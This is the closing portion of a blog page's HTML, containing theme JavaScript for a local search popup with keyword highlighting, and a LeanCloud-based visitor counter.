                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'true') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  
  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
  <script>AV.initialize("otYDWvApXTYxWRiyvbntKaiI-gzGzoHsz#<app_id>", "BGOUX1v4oeMfXIDWyV4dxdUt#<app_key>");</script>
  <script>
    function showTime(Counter) {
      var query = new AV.Query(Counter);
      var entries = [];
      var $visitors = $(".leancloud_visitors");

      $visitors.each(function () {
        entries.push( $(this).attr("id").trim() );
      });

      query.containedIn('url', entries);
      query.find()
        .done(function (results) {
          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';

          if (results.length === 0) {
            $visitors.find(COUNT_CONTAINER_REF).text(0);
            return;
          }

          for (var i = 0; i < results.length; i++) {
            var item = results[i];
            var url = item.get('url');
            var time = item.get('time');
            var element = document.getElementById(url);

            $(element).find(COUNT_CONTAINER_REF).text(time);
          }
          for(var i = 0; i < entries.length; i++) {
            var url = entries[i];
            var element = document.getElementById(url);
            var countSpan = $(element).find(COUNT_CONTAINER_REF);
            if( countSpan.text() == '') {
              countSpan.text(0);
            }
          }
        })
        .fail(function (object, error) {
          console.log("Error: " + error.code + " " + error.message);
        });
    }

    function addCount(Counter) {
      var $visitors = $(".leancloud_visitors");
      var url = $visitors.attr('id').trim();
      var title = $visitors.attr('data-flag-title').trim();
      var query = new AV.Query(Counter);

      query.equalTo("url", url);
      query.find({
        success: function(results) {
          if (results.length > 0) {
            var counter = results[0];
            counter.fetchWhenSave(true);
            counter.increment("time");
            counter.save(null, {
              success: function(counter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(counter.get('time'));
              },
              error: function(counter, error) {
                console.log('Failed to save Visitor num, with error message: ' + error.message);
              }
            });
          } else {
            var newcounter = new Counter();
            /* Set ACL */
            var acl = new AV.ACL();
            acl.setPublicReadAccess(true);
            acl.setPublicWriteAccess(true);
            newcounter.setACL(acl);
            /* End Set ACL */
            newcounter.set("title", title);
            newcounter.set("url", url);
            newcounter.set("time", 1);
            newcounter.save(null, {
              success: function(newcounter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
              },
              error: function(newcounter, error) {
                console.log('Failed to create');
              }
            });
          }
        },
        error: function(error) {
          console.log('Error:' + error.code + " " + error.message);
        }
      });
    }

    $(function() {
      var Counter = AV.Object.extend("Counter");
      if ($('.leancloud_visitors').length == 1) {
        addCount(Counter);
      } else if ($('.post-title-link').length > 1) {
        showTime(Counter);
      }
    });
  </script>



  

  

  
  

  

  

  

</body>
</html>
<!-- 页面点击小红心 -->
<script type="text/javascript" src="/js/src/love.js"></script>